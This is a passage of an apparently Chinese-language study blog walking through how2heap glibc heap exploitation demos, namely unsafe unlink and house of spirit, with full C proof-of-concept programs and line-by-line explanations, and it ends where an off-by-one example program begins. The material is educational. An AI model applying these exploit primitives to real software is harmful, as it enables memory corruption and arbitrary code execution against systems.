+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>uint64_t</span> <span style=color:#f92672>*</span>chunk1_ptr  <span style=color:#f92672>=</span> (<span style=color:#66d9ef>uint64_t</span><span style=color:#f92672>*</span>) <span style=color:#a6e22e>malloc</span>(malloc_size); <span style=color:#75715e>//chunk1
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;The global chunk0_ptr is at %p, pointing to %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#f92672>&amp;</span>chunk0_ptr, chunk0_ptr);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;The victim chunk we are going to corrupt is at %p</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>, chunk1_ptr);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;We create a fake chunk inside chunk0.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	chunk0_ptr[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> chunk0_ptr[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>] <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>;
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;We setup the &#39;next_free_chunk&#39; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	chunk0_ptr[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> (<span style=color:#66d9ef>uint64_t</span>) <span style=color:#f92672>&amp;</span>chunk0_ptr<span style=color:#f92672>-</span>(<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>uint64_t</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>3</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;We setup the &#39;previous_free_chunk&#39; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	chunk0_ptr[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> (<span style=color:#66d9ef>uint64_t</span>) <span style=color:#f92672>&amp;</span>chunk0_ptr<span style=color:#f92672>-</span>(<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>uint64_t</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Fake chunk fd: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,(<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>) chunk0_ptr[<span style=color:#ae81ff>2</span>]);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Fake chunk bk: %p</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>,(<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>) chunk0_ptr[<span style=color:#ae81ff>3</span>]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>uint64_t</span> <span style=color:#f92672>*</span>chunk1_hdr <span style=color:#f92672>=</span> chunk1_ptr <span style=color:#f92672>-</span> header_size;
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;We shrink the size of chunk0 (saved as &#39;previous_size&#39; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;It&#39;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	chunk1_hdr[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> malloc_size;
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;If we had &#39;normally&#39; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,(<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)chunk1_hdr[<span style=color:#ae81ff>0</span>]);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;We mark our fake chunk as free by setting &#39;previous_in_use&#39; of chunk1 as False.</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	chunk1_hdr[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>&amp;=</span> <span style=color:#f92672>~</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>free</span>(chunk1_ptr);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> victim_string[<span style=color:#ae81ff>8</span>];
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>strcpy</span>(victim_string,<span style=color:#e6db74>&#34;Hello!~&#34;</span>);
+</span></span><span style=display:flex><span>	chunk0_ptr[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> (<span style=color:#66d9ef>uint64_t</span>) victim_string;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Original value: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,victim_string);
+</span></span><span style=display:flex><span>	chunk0_ptr[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4141414142424242LL</span>;
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;New Value: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,victim_string);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// sanity check
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>assert</span>(<span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)victim_string <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x4141414142424242L</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>整个程序主要变量的内存分布如下图：</p><p><img src=/imgs/img-lazy-loading.gif data-src=./image-20230822125534227.png alt=image-20230822125534227></p><p>程序首先申请了两个大小为malloc_size的堆块，依次为 chunk0和chunk1。</p><p>然后我们在chunk0内部伪造一个堆块，chunk0的地址即为fake chunk的起始地址。</p><p>首先我们修改fake chunk的size为chunk0的size - 0x10字节，即29行的</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
+</span></span></code></pre></div><p>然后修改fake chunk的fd为<code>&amp;chunk0_ptr-(sizeof(uint64_t)*3)</code>，以绕过 <code>P->fd->bk != P</code>的检查（使<code>P->fd->bk</code>等于fake chunk的地址），即31行的</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);
+</span></span></code></pre></div><p>同理，修改fake chunk的bk为<code>&amp;chunk0_ptr-(sizeof(uint64_t)*2)</code>，以绕过 <code>P->bk->fd != P</code>的检查（使<code>P->bk->fd</code>等于fake chunk的地址），即34行的</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);
+</span></span></code></pre></div><p>假定我们在chunk0_ptr处能实现溢出，所以我们可以随意修改chunk1的数据。</p><p>那么我们修改chunk1的prev_size为prev_size - 0x10，这样我们在free chunk1时，会认为其前一个堆块位于fake chunk。另外我们要修改chunk1的size字段的prev_inuse位。</p><p>此时free chunk1，我们构造的fake chunk就会被unlink。unlink的宏定义如下：
+<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344" title="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344" rel="noopener external nofollow noreferrer" target=_blank class=exturl>https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344
+<i class="fa fa-external-link-alt"></i></a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>1343 /* Take a chunk off a bin list */
+</span></span><span style=display:flex><span>1344 #define unlink(AV, P, BK, FD) {                                            \
+</span></span><span style=display:flex><span>1345     FD = P-&gt;fd;                                                               \
+</span></span><span style=display:flex><span>1346     BK = P-&gt;bk;                                                               \
+</span></span><span style=display:flex><span>1347     if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                     \
+</span></span><span style=display:flex><span>1348       malloc_printerr (check_action, &#34;corrupted double-linked list&#34;, P, AV);  \
+</span></span><span style=display:flex><span>1349     else {                                                                    \
+</span></span><span style=display:flex><span>1350         FD-&gt;bk = BK;                                                          \
+</span></span><span style=display:flex><span>1351         BK-&gt;fd = FD;                                                          \
+</span></span><span style=display:flex><span>1352         if (!in_smallbin_range (P-&gt;size)                                      \
+</span></span><span style=display:flex><span>1353             &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {                \
+</span></span><span style=display:flex><span>1354             if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)        \
+</span></span><span style=display:flex><span>1355                 || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \
+</span></span><span style=display:flex><span>1356               malloc_printerr (check_action,                                  \
+</span></span><span style=display:flex><span>1357                                &#34;corrupted double-linked list (not small)&#34;,    \
+</span></span><span style=display:flex><span>1358                                P, AV);                                        \
+</span></span><span style=display:flex><span>1359             if (FD-&gt;fd_nextsize == NULL) {                                    \
+</span></span><span style=display:flex><span>1360                 if (P-&gt;fd_nextsize == P)                                      \
+</span></span><span style=display:flex><span>1361                   FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                     \
+</span></span><span style=display:flex><span>1362                 else {                                                        \
+</span></span><span style=display:flex><span>1363                     FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                         \
+</span></span><span style=display:flex><span>1364                     FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                         \
+</span></span><span style=display:flex><span>1365                     P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                         \
+</span></span><span style=display:flex><span>1366                     P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                         \
+</span></span><span style=display:flex><span>1367                   }                                                           \
+</span></span><span style=display:flex><span>1368               } else {                                                        \
+</span></span><span style=display:flex><span>1369                 P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                 \
+</span></span><span style=display:flex><span>1370                 P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                 \
+</span></span><span style=display:flex><span>1371               }                                                               \
+</span></span><span style=display:flex><span>1372           }                                                                   \
+</span></span><span style=display:flex><span>1373       }                                                                       \
+</span></span><span style=display:flex><span>1374 }
+</span></span></code></pre></div><p>由于我们的大小在smallbin的范围内，1352行以后的检查不会进行，1347行的检查已经被绕过。</p><p>等价代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>FD = P-&gt;fd; // FD的值： &amp;chunk0_ptr-(sizeof(uint64_t)*3)
+</span></span><span style=display:flex><span>BK = P-&gt;bk; // BK的值: &amp;chunk0_ptr-(sizeof(uint64_t)*2)
+</span></span><span style=display:flex><span>FD-&gt;bk = BK // *(&amp;chunk0_ptr-(sizeof(uint64_t)*3)+(sizeof(uint64_t)*3)) = BK
+</span></span><span style=display:flex><span>BK-&gt;fd = FD // *(&amp;chunk0_ptr-(sizeof(uint64_t)*2)+(sizeof(uint64_t)*2)) = FD
+</span></span></code></pre></div><p>这里是关键的地方，<code>FD->bk</code>和<code>BK->fd</code>就是变量chunk0_ptr的地址（BSS段），最后一行的作用是将变量chunk0_ptr的内容改成其所在地址减去0x18。</p><p>这样chunk0_ptr[3]（chunk0_ptr+0x18）就是变量chunk0_ptr自身的地址，这时我们可以用下面的语句修改变量chunk0_ptr指向的地址。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>chunk0_ptr[3] = (uint64_t) victim_string;
+</span></span></code></pre></div><p>然后我们就可以实现任意地址写：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>chunk0_ptr[0] = 0x4141414142424242LL;
+</span></span></code></pre></div><p>如果不明白可以看下面的代码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#include &lt;stdio.h&gt;
+</span></span><span style=display:flex><span>#include &lt;stdlib.h&gt;
+</span></span><span style=display:flex><span>#include &lt;string.h&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>int main() {
+</span></span><span style=display:flex><span>    char victim_string[8];
+</span></span><span style=display:flex><span>	strcpy(victim_string,&#34;Hello!~&#34;);
+</span></span><span style=display:flex><span>    printf(&#34;victim_string is at %p\n&#34;, &amp;victim_string);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    char** ptr_array = malloc(sizeof(char*)*5);
+</span></span><span style=display:flex><span>    printf(&#34;ptr_array is at %p\n&#34;, &amp;ptr_array);
+</span></span><span style=display:flex><span>    printf(&#34;ptr_array sotres %p\n&#34;, ptr_array);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    printf(&#34;&amp;ptr_array[-3]: %p\n&#34;, &amp;ptr_array[-3]);
+</span></span><span style=display:flex><span>    ptr_array = &amp;ptr_array - 3;
+</span></span><span style=display:flex><span>    printf(&#34;ptr_array now stores %p\n&#34;, ptr_array);
+</span></span><span style=display:flex><span>    ptr_array[3] = victim_string;
+</span></span><span style=display:flex><span>    printf(&#34;ptr_array[3] now stores %p\n&#34;, ptr_array[3]);
+</span></span><span style=display:flex><span>    ptr_array[0] = 0x4141414142424242LL;
+</span></span><span style=display:flex><span>    printf(&#34;victim_string %s\n&#34;, victim_string);
+</span></span><span style=display:flex><span>    return 0;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=house_of_spirit>house_of_spirit
+<a class=header-anchor href=#house_of_spirit></a></h2><p><code>Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer.</code></p><p>这个程序通过伪造一个堆块，然后将其free，这样在下次malloc时便会返回伪造的堆块。</p><p>适用于存在栈溢出但是无法溢出到返回地址，但是可以覆盖一个指向堆区域的指针，将其改写为指向栈上的fake chunk，这样free便能返回栈上的地址。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;assert.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>setbuf</span>(stdout, NULL);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;This file demonstrates the house of spirit attack.&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;This attack adds a non-heap pointer into fastbin, thus leading to (nearly) arbitrary write.&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Required primitives: known target address, ability to set up the start/end of the target memory&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Step 1: Allocate 7 chunks and free them to fill up tcache&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>chunks[<span style=color:#ae81ff>7</span>];
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>7</span>; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>		chunks[i] <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(<span style=color:#ae81ff>0x30</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>7</span>; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>free</span>(chunks[i]);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Step 2: Prepare the fake chunk&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>long</span> fake_chunks[<span style=color:#ae81ff>10</span>] <span style=color:#a6e22e>__attribute__</span> ((<span style=color:#a6e22e>aligned</span> (<span style=color:#ae81ff>0x10</span>)));
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;The target fake chunk is at %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, fake_chunks);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;It contains two chunks. The first starts at %p and the second at %p.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#f92672>&amp;</span>fake_chunks[<span style=color:#ae81ff>1</span>], <span style=color:#f92672>&amp;</span>fake_chunks[<span style=color:#ae81ff>9</span>]);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Now set the size of the chunk (%p) to 0x40 so malloc will think it is a valid chunk.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#f92672>&amp;</span>fake_chunks[<span style=color:#ae81ff>1</span>]);
+</span></span><span style=display:flex><span>	fake_chunks[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x40</span>; <span style=color:#75715e>// this is the size
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Set the size of the chunk (%p) to 0x1234 so freeing the first chunk can succeed.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#f92672>&amp;</span>fake_chunks[<span style=color:#ae81ff>9</span>]);
+</span></span><span style=display:flex><span>	fake_chunks[<span style=color:#ae81ff>9</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x1234</span>; <span style=color:#75715e>// nextsize
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Step 3: Free the first fake chunk&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Note that the address of the fake chunk must be 16-byte aligned.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>victim <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>fake_chunks[<span style=color:#ae81ff>2</span>];
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>free</span>(victim);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Step 4: Take out the fake chunk&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Now the next calloc will return our fake chunk at %p!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#f92672>&amp;</span>fake_chunks[<span style=color:#ae81ff>2</span>]);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;malloc can do the trick as well, you just need to do it for 8 times.&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>allocated <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0x30</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;malloc(0x30): %p, fake chunk: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, allocated, victim);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>assert</span>(allocated <span style=color:#f92672>==</span> victim);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>在free伪造的chunk时需要绕过一些检查：</p><ol><li>IS_MMAPED和NON_MAIN_AREANA位必须为0</li><li>chunk size满足fast bin的大小</li><li>next_chunk的大小需要大于2*SIZE_SZ且小于av->system_mem</li></ol><p>效果：</p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230403222402619.png alt=image-20230403222402619></p><h2 id=poison_null_byte>poison_null_byte
+<a class=header-anchor href=#poison_null_byte></a></h2><p><code>Exploiting a single null byte overflow.</code></p><p>适用场景：可以溢出到malloc chunk的下一个chunk，这里只能溢出为null，可以实现改小next chunk的size然后实现进一步利用。</p><p>这一节以
+<a href=https://devel0pment.de/ title=devel0pment.de rel="noopener external nofollow noreferrer" target=_blank class=exturl>devel0pment.de
+<i class="fa fa-external-link-alt"></i>
+</a>的
+<a href="https://devel0pment.de/?p=688#basic" title="Heap Exploitation: Off-By-One / Poison Null Byte – devel0pment.de" rel="noopener external nofollow noreferrer" target=_blank class=exturl>Heap Exploitation: Off-By-One / Poison Null Byte – devel0pment.de
+<i class="fa fa-external-link-alt"></i>
+</a>文章为例，从off by one一路走到getshell（部分图片同样引用自原文章）</p><p>环境是Ubuntu 16.04.7 LTS amd64，glibc 2.23-0ubuntu11.3(<code>apt show libc6</code>可查看当前libc版本)</p><p>示例程序的源代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>/**
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * heap.c
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * sample program: heap off-by-one vulnerability
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * 
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * gcc heap.c -pie -fPIE -Wl,-z,relro,-z,now -o heap
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *
+</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
